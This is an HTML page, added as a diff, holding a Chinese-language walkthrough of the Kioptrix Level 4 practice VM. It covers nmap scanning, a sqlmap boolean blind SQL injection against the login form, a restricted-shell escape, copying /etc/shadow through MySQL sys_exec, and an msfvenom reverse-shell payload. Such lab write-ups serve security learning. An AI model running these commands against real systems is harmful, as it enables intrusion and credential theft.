@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>level 4（布尔盲注）</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">level 4（布尔盲注）</h1>
+        <div class="show-content">
+          <p>（下载地址见以前的文章）该虚拟机下载下来后只有一个vmdk文件，要创建一个新建一个虚拟机才能使用，<a href="https://kb.vmware.com/s/article/2095222" target="_blank">方法详情</a></p><p>按例扫描IP和端口，信息搜集如下：</p><p>192.168.1.107</p><p>22（ssh）、80（http）、139（Samba）、445</p><p>22端口版本  OpenSSH 4.7p1   </p><p>80端口           Apache/2.2.8 (Ubuntu) PHP/5.2.4-2 <b>ubuntu5.6</b> with Suhosin-Patch Server</p><p>                       经过paros的爬虫，确认该网站只有这么一个登陆表单，没有其余隐藏内容。</p><p>                       该网页确认<b>似乎没有绕过表单的漏洞</b>，单引号没有报错，提示错误的用户名和密码。提交用户名和密码使用的是post方式。</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-f6ad3230ee381e6d.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>再用paros进行扫描，发现可能有sql注入漏洞。</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-f9c7a22d7ac2078b.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>139端口        netbios-ssn Samba smbd 3.X - 4.X</p><p>445端口        <b>netbios-ssn</b> Samba smbd <b>3.0.28a</b></p><p>linux内核版本 Linux 2.6.9 - 2.6.33</p><p>smb-enum-users: Domain: KIOPTRIX4; Users: <b>john, loneferret, nobody, robert, root</b></p><p><b>使用的命令：</b></p><blockquote>
+<p>nmap --script=auth 192.168.1.107</p>
+<p>
+
+nmap --script=vuln -P0 -A -sT
+
+192.168.1.107</p>
+</blockquote><h1>有针对性的再次探测</h1><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-8c07108a779909de.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>确认了sql注入，获取了数据库类型为Mysql。有注入的是mypassword参数。myusername参数用单引号没有报错。</p><blockquote><p>sqlmap -u "http://192.168.1.107" --forms --dbms=MySQL</p></blockquote><p>没有检测出sql注入， all tested parameters appear to be not injectable.…… <a href="http://www.binarytides.com/using-sqlmap-with-login-forms/" target="_blank">参考</a></p><blockquote>
+<p>sqlmap -u "http://192.168.1.107/checklogin.php" --data="mypassword=root"</p>
+<p>sqlmap -u "http://192.168.1.107/checklogin.php" --data="mypassword=' or '1'='1"</p>
+</blockquote><p>最后一条命令检测出了，可以看到的是使用的<b>布尔盲注</b>。</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-721dd8cef8719be9.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>然后就可以如行云流水般的获取到用户名和密码。</p><p>当前数据库  members 表名members 列名 id;username;password</p><p>password数据：ADGAdsafdfwt4gadfga== </p><p>                             MyNameIsJohn</p><p>用户名：john </p><p>               robert</p><p>什么情况？明文密码，你TM逗我。。</p><p>ssh登陆：尝试robert，貌似不是随便一台主机都能连接，绑定了。<a href="http://www.worldhello.net/2010/04/08/1026.html" target="_blank">ssh公钥检查</a></p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-688986b993c17f85.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>算了换一个，通过john /  MyNameIsJohn，成功登陆</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-fe44554ec2103177.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p>貌似shell被占用，screw up的意思是"一个完全管理不善或者处理不当的情况"</p><p>于是能够运行的命令就很有限了。</p><h1>突破限制的shell</h1><blockquote><p>echo os.system('/bin/bash')</p></blockquote><p>echo是一个把字符串输出到终端上的命令。 本来是被限制了的shell，如果运行别的命令，就会不予执行。</p><p>本来你关在牢房里，活动空间不过几平米。然而运行这条命令，就相当于把锁打开。echo相当于我们的中间人，它返回了bash shell。</p><h1>提权</h1><p>现在是普通用户权限，可以通过那些有着管理员权限的程序，执行只有管理员才能执行的命令。</p><p>就好比，你的权限没有那么大，但是你的朋友有，于是你可以让他你的忙，达成你一个人办不成的事情。</p><blockquote><p><b>ps aux | grep root</b></p></blockquote><p>查看具有管理员权限的进程</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-895c8352a39f7a06.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p><a href="https://www.jianshu.com/p/77fa1245427a" target="_blank">使用mysql</a>。</p><p>不知道这里为什么没有输入密码，就可以登陆mysql。</p><div class="image-package">
+<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-b05028a4ecfbed7f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
+</div><p><b>select load_file('/etc/passwd');   查看是否能显示用户名，可以</b></p><p><b>select load_file('/etc/shadow')； 查看能否显示密码，不能<br></b></p><p><b>select sys_exec("cat /etc/shadow &gt; /tmp/shadow");  将密码文件复制到其他目录<br></b></p><p><b>select sys_exec("chown john /tmp/shadow");   将复制后的密码文件赋予查看权限<br></b></p><p><b>cat /tmp/shadow;  查看密码<br></b></p><p><b>之后和上一关一样，用msfvenom创建攻击载荷，用nc发送该文件。用mysql运行攻击载荷。成功获取最高权限。</b></p><p><b><a href="https://www.aldeid.com/wiki/Kioptrix4" target="_blank">参考writeup</a><br></b></p><h1>总结：</h1><p>mysql中执行命令的方式为，select sys_exec('需要执行的bash shell命令')</p><p>创建攻击载荷的命令：-p是payload，-f是format。确定攻击载荷的平台类型和形式。elf是linux平台可执行文件，类似与exe。</p><p><b>msfvenom -p linux/x86/shell_reverse_tcp -f elf  </b><b>lhost=192.168.60.136 lport=1234 &gt; /var/www/shell</b></p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
